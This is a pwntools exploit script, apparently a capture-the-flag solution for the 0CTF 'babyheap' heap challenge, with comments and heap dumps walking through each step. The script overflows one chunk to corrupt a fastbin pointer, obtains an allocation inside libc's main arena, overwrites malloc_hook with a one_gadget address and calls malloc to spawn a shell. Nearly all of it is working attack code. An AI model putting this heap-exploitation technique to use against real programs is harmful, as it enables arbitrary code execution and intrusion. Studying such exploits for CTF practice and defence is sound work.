from pwn import *

r = process("./0ctfbabyheap")
if len(sys.argv) > 1 and sys.argv[1] == 'gdb':
    gdb.attach(r, """set disassembly-flavor intel
    b main
    """)

def alloc(size):
    r.sendline('1')
    r.sendlineafter(': ', str(size))
    print r.recvuntil(': ', timeout=1)

def fill(idx, data):
    r.sendline('2')
    r.sendlineafter(': ', str(idx))
    r.sendlineafter(': ', str(len(data)))
    r.sendafter(': ', data)
    r.recvuntil(': ')

def free(idx):
    r.sendline('3')
    r.sendlineafter(': ', str(idx))
    r.recvuntil(': ')

def dump(idx):
    r.sendline('4')
    r.sendlineafter(': ', str(idx))
    r.recvuntil(': \n')
    data = r.recvline()
    r.recvuntil(': ')
    return data

# We're given an arbitrary heap overflow. Our strategy will be to finagle
# the heap such that we're given an address in the main arena after a malloc().
# We'll then overwrite malloc_hook with one_gadget to win.

malloc_hook    = 0x7ffff7dd3740 # obviously, these three constants are
main_arena_ptr = 0x7ffff7dd371d # specific to your copy of libc.
one_gadget     = 0x7ffff7a11000 + 0x4647c

alloc(100) # 0   |
alloc(100) # 1   |----- first, create 3 adjacent chunks in the 0x70-size fastbin
alloc(100) # 2   |

free(2) # then free the last two chunks, creating a fastbin list of length 2
free(1) # fastbin[5]: 0x555555757070 --> 0x5555557570e0 --> 0x0

# at this point our heap looks like this:
# notice that the fd pointer of the chunk at 0x555555757070 points to our second
# free chunk at 00005555557570E0
'''
0x555555757000: 0000000000000000 0000000000000071 | <-- index 0 (allocated)
0x555555757010: 0000000000000000 0000000000000000 |
0x555555757020: 0000000000000000 0000000000000000 |
0x555555757030: 0000000000000000 0000000000000000 |
0x555555757040: 0000000000000000 0000000000000000 |
0x555555757050: 0000000000000000 0000000000000000 |
0x555555757060: 0000000000000000 0000000000000000 |
0x555555757070: 0000000000000000 0000000000000071 | <-- index 1 (free)
0x555555757080: 00005555557570E0 0000000000000000 | <-- fd pointer
0x555555757090: 0000000000000000 0000000000000000 |
0x5555557570A0: 0000000000000000 0000000000000000 |
0x5555557570B0: 0000000000000000 0000000000000000 |
0x5555557570C0: 0000000000000000 0000000000000000 |
0x5555557570D0: 0000000000000000 0000000000000000 |
0x5555557570E0: 0000000000000000 0000000000000071 | <-- index 2 (free)
0x5555557570F0: 0000000000000000 0000000000000000 |
0x555555757100: 0000000000000000 0000000000000000 |
0x555555757110: 0000000000000000 0000000000000000 |
0x555555757120: 0000000000000000 0000000000000000 |
0x555555757130: 0000000000000000 0000000000000000 |
0x555555757140: 0000000000000000 0000000000000000 |
0x555555757150: 0000000000000000 0000000000020EB1 | <-- top chunk
'''

# now, we'll overflow chunk 0 to corrupt the fd pointer for chunk 1
fill(0, 'A' * 0x68 + p64(0x71) + p64(main_arena_ptr))

# after this, fastbin[5] looks like: 0x555555757070 --> 0x7ffff7dd371d --> ...
'''
0x555555757000: 0000000000000000 0000000000000071 | <-- index 0 (allocated)
0x555555757010: 0000000000000000 0000000000000000 |
0x555555757020: 0000000000000000 0000000000000000 |
0x555555757030: 0000000000000000 0000000000000000 |
0x555555757040: 0000000000000000 0000000000000000 |
0x555555757050: 0000000000000000 0000000000000000 |
0x555555757060: 0000000000000000 0000000000000000 |
0x555555757070: 0000000000000000 0000000000000071 | <-- index 1 (free)
0x555555757080: 00007ffff7dd371d 0000000000000000 | <-- fd pointer
0x555555757090: 0000000000000000 0000000000000000 |
0x5555557570A0: 0000000000000000 0000000000000000 |
0x5555557570B0: 0000000000000000 0000000000000000 |
0x5555557570C0: 0000000000000000 0000000000000000 |
0x5555557570D0: 0000000000000000 0000000000000000 |
0x5555557570E0: 0000000000000000 0000000000000071 | <-- index 2 (free)
0x5555557570F0: 0000000000000000 0000000000000000 |
0x555555757100: 0000000000000000 0000000000000000 |
0x555555757110: 0000000000000000 0000000000000000 |
0x555555757120: 0000000000000000 0000000000000000 |
0x555555757130: 0000000000000000 0000000000000000 |
0x555555757140: 0000000000000000 0000000000000000 |
0x555555757150: 0000000000000000 0000000000020EB1 | <-- top chunk
'''

# We chose 0x7ffff7dd371d because it was a pointer to the main_arena such that
# BYTE PTR *( + 8) = 0x7f:

'''
0x7ffff7dd371d:	fff7a94fc0000000 000000000000007f | <-- ends in 0x7f,
0x7ffff7dd372d:	fff7a94f60000000 000000000000007f |     fools malloc
0x7ffff7dd373d:	0000000000000000 0000000000000000 |     into thinking
0x7ffff7dd374d:	0000000000000000 0000000000000000 |     this is a valid
0x7ffff7dd375d:	0000000000000000 0000000000000000 |     fastbin chunk
'''

# malloc_hook is located at 0x7ffff7dd3740

alloc(100) # 1    (will have address 0x555555757070 + 16)
alloc(100) # 2    (will have address 0x7ffff7dd371d + 16)

fill(2, 'A' * (malloc_hook - (main_arena_ptr + 16)) + p64(one_gadget))

# at this point we've overwritten malloc_hook with one_gadget. Any call to
# malloc() will pop a shell.
alloc(1)
r.interactive()
